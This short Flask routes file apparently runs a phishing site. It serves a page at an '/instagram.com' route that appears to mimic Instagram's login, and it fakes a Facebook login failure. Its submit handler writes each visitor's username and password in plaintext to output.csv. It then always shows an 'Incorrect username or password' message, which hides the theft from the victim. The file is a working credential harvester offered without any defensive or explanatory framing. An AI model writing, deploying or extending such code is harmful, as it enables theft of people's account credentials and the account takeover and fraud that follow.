from flask import render_template, url_for, redirect, request, flash
from flask import current_app as app
import pandas as pd

# Home page
@app.route("/")
def home_page():
    return render_template("index.html")

# Instagram page
@app.route("/instagram.com")
def instagram_page():
    return render_template("instagram.html")

# Facebook page
@app.route("/facebook.com")
def facebook_page():
    flash("Error while loging with facebook. Try another method")
    return redirect(url_for("home_page"))

# storing user data
@app.route("/submit", methods=["GET", "POST"])
def userdata():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        try:
            df = pd.read_csv("output.csv")
            df.loc[len(df)] = [str(username)]+[str(password)]
            df.to_csv("output.csv", index=False)
        except Exception as e:
            flash("Internal server error. Try after some time.")

        flash("Incorrect username or password")

    return redirect(url_for("instagram_page"))
    









